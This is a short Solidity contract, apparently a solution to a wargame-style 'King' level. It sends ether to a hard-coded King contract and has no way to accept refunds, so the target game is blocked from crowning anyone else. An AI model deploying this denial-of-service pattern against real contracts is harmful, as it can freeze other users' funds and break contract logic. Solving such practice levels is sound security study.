// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./king.sol";

contract KingHack {

  King king = King(0x242D62A620cafe42135D8Ec50f5c5BC1393b7Ed6);


  constructor() public payable {
    (bool s,) = address(king).call{value:msg.value}("");
    require(s, "fail.");
  }
}